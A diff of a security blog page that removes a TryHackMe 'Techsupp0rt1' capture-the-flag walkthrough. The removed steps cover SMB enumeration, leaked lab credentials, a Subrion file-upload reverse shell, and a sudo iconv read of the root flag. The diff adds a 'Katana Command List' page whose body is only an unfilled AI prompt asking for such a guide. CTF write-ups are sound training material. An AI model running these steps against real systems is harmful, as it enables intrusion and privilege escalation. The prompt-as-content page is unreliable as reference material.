@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Techsupp0rt1 | Technical Intelligence Labs</title>
+    <title>Katana Command List | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,178 +106,36 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
-                <span>// 2024-12-30</span>
-                <span>// ID: REF-Techsupp0rt1</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">commands</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Katana Command List</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Techsupp0rt1</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Katana Command List</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- katana, cybersecurity, command reference, beginner -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-139/tcp open  netbios-ssn
-445/tcp open  microsoft-ds
-</code></pre>
-
-<pre class="codehilite"><code>smbclient -L \\\\10.66.145.77\\                                          
-Password for [WORKGROUP\kali]:
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        print$          Disk      Printer Drivers
-        websvr          Disk      
-        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
-</code></pre>
-
-<pre class="codehilite"><code>smbclient -N //10.66.145.77/websvr 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Sat May 29 03:17:38 2021
-  ..                                  D        0  Sat May 29 03:03:47 2021
-  enter.txt                           N      273  Sat May 29 03:17:38 2021
-
-                8460484 blocks of size 1024. 5699672 blocks available
-smb: \&gt; cat enter.txt
-cat: command not found
-smb: \&gt; type enter.txt
-type: command not found
-smb: \&gt; get enter.txt
-getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
-smb: \&gt; exit
-</code></pre>
-
-<pre class="codehilite"><code> cat enter.txt         
-GOALS
-=====
-1)Make fake popup and host it online on Digital Ocean server
-2)Fix subrion site, /subrion doesn't work, edit from panel
-3)Edit wordpress website
-
-IMP
-===
-Subrion creds
-|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
-Wordpress creds
-|-&gt;
-</code></pre>
-
-<blockquote>
-<p>to get password</p>
-</blockquote>
-<pre class="codehilite"><code>FROM
-
-base58 --&gt; base32 --&gt; base64 
-</code></pre>
-
-<blockquote>
-<p>login to ‘Subrion/Pannel'</p>
-</blockquote>
-<pre class="codehilite"><code>└─$ searchsploit 'subrion'
-
-Subrion CMS 4.2.1 - Arbitrary File Upload                                                                               | php/webapps/49876.py
-</code></pre>
-
-<blockquote>
-<p>before upload reverse shell need to change filetype  <code>phar</code></p>
-</blockquote>
-<pre class="codehilite"><code>www-data@TechSupport:/var/www$ cd html
-www-data@TechSupport:/var/www/html$ ls
-index.html  phpinfo.php  subrion  test  wordpress
-www-data@TechSupport:/var/www/html$ cd wordpress
-www-data@TechSupport:/var/www/html/wordpress$ ls
-index.php        wp-blog-header.php    wp-includes        wp-settings.php
-license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
-readme.html      wp-config.php         wp-load.php        wp-trackback.php
-wp-activate.php  wp-content            wp-login.php       xmlrpc.php
-wp-admin         wp-cron.php           wp-mail.php
-www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
-&lt;?php
-/**
-
- * @link https://wordpress.org/support/article/editing-wp-config-php/
- *
- * @package WordPress
- */
-
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wpdb' );
-
-/** MySQL database username */
-define( 'DB_USER', 'support' );
-
-/** MySQL database password */
-define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
-
-/** MySQL hostname */
-define( 'DB_HOST', 'localhost' );
-
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
-
-/**#@+
- * Authentication Unique Keys and Salts.
- *
-
-
-/**#@-*/
-
-/**
- * WordPress Database Table prefix.
- *
- * You can have multiple installations in one database if you give each
- * a unique prefix. Only numbers, letters, and underscores please!
- */
-$table_prefix = 'wp_';
-
-/**
- * For developers: WordPress debugging mode.
- *
- * Change this to true to enable the display of notices during development.
- * It is strongly recommended that plugin and theme developers use WP_DEBUG
- * in their development environments.
- *
- * For information on other constants that can be used for debugging,
- * visit the documentation.
- *
- * @link https://wordpress.org/support/article/debugging-in-wordpress/
- */
-define( 'WP_DEBUG', false );
-
-/* That's all, stop editing! Happy publishing. */
-
-/** Absolute path to the WordPress directory. */
-if ( ! defined( 'ABSPATH' ) ) {
-        define( 'ABSPATH', __DIR__ . '/wordpress/' );
-}
-</code></pre>
-
-<pre class="codehilite"><code>Matching Defaults entries for scamsite on TechSupport:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User scamsite may run the following commands on TechSupport:
-    (ALL) NOPASSWD: /usr/bin/iconv
-</code></pre>
-
-<pre class="codehilite"><code> LFILE=/root/root.txt
-scamsite@TechSupport:/home$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 &quot;$LFILE&quot;
-.......................  -
-scamsite@TechSupport:/home$ 
-</code></pre>
+<h1>Katana Command Guide</h1>
+<p>Please generate a detailed educational guide for the <strong>Katana</strong> tool.<br />
+Follow this structure exactly:</p>
+<ol>
+<li><strong>Brief Explanation</strong>: Explain what Katana is and why it's used in cybersecurity.</li>
+<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
+<li>For EACH command, provide the exact syntax in a code block.</li>
+<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
+<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
+</ul>
+</li>
+<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
+</ol>
+<p><strong>Tone</strong>: Educational, for a beginner student.</p>
         </div>
     </main>
 
